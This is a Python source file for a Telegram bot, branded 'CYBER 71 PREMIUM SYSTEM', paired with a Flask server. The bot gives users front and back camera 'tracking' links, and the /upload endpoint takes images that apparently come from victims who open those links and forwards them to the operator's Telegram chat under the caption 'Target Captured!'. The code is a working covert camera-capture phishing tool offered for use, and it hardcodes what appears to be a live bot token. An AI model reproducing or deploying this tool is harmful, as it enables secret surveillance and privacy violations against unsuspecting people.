import base64
import threading
import requests
import os
from datetime import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# --- চূড়ান্ত কনফিগারেশন ---
TOKEN = '8684351674:AAF8Zhhy0C50xt25V0uLquJmr7FT4tmJVkY'
ADMIN_ID = '6823368645' 
ADMIN_LINK = 'https://t.me/KING_OF_ENAFUL' 

# আপনার নতুন GitHub ট্র্যাকিং লিঙ্ক
MY_GITHUB_BASE = "https://vsalleditorind.github.io/t/"

# লিঙ্ক সেটআপ (GitHub এর মাধ্যমে)
FRONT_LINK = f"{MY_GITHUB_BASE}?mode=front"
BACK_LINK  = f"{MY_GITHUB_BASE}?mode=back"

PORT = 5000
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    try:
        img_bytes = base64.b64decode(data['img'].split(',')[1])
        # ছবি সরাসরি আপনার টেলিগ্রাম আইডিতে পাঠাবে
        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto', 
                      params={'chat_id': ADMIN_ID, 'caption': f'📸 **Target Captured!**\nID: {data["id"]}\n\n🛡️ *System by BOSS ENAFUL*'},
                      files={'photo': ('snap.png', img_bytes)})
    except: pass
    return "OK"

# --- মেইন ইন্টারফেস ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    now = datetime.now().strftime("%Y-%m-%d %H:%M")
    
    try: ip_addr = requests.get('https://api.ipify.org').text
    except: ip_addr = "Unknown"
    
    welcome_text = (
        f"🛡️ **CYBER 71 PREMIUM SYSTEM** 🛡️\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **OWNER:** **BOSS ENAFUL**\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📝 **USER PROFILE:**\n"
        f"┣ 👤 **Name:** {user.first_name}\n"
        f"┣ 🆔 **ID:** `{user.id}`\n"
        f"┣ 🌐 **IP:** {ip_addr}\n"
        f"┗ 📅 **Date:** {now}\n"
    )
    
    # শুধুমাত্র ফ্রন্ট এবং ব্যাক ক্যামেরা বাটন রাখা হয়েছে
    keyboard = [
        [InlineKeyboardButton("📸 Front Cam", callback_data='gen_front'), 
         InlineKeyboardButton("📸 Back Cam", callback_data='gen_back')],
        [InlineKeyboardButton("👨‍💻 OWNER (ENAFUL)", url=ADMIN_LINK)]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.message:
        await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.edit_message_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.data == 'gen_front':
        msg = f"✅ **Front Camera Link Generated!**\n\nনিচের বাটন থেকে লিঙ্কটি কপি করুন:"
        keyboard = [
            [InlineKeyboardButton("🔗 Copy Link", url=FRONT_LINK)],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    
    elif query.data == 'gen_back':
        msg = f"✅ **Back Camera Link Generated!**\n\nনিচের বাটন থেকে লিঙ্কটি কপি করুন:"
        keyboard = [
            [InlineKeyboardButton("🔗 Copy Link", url=BACK_LINK)],
            [InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        
    elif query.data == 'back':
        await start(update, context)

def run_flask():
    app.run(host='0.0.0.0', port=PORT)

if __name__ == '__main__':
    threading.Thread(target=run_flask).start()
    bot = Application.builder().token(TOKEN).build()
    bot.add_handler(CommandHandler("start", start))
    bot.add_handler(CallbackQueryHandler(handle_callback))
    print("--------------------------------\n  BOSS ENAFUL | SYSTEM ONLINE  \n--------------------------------")
    bot.run_polling()
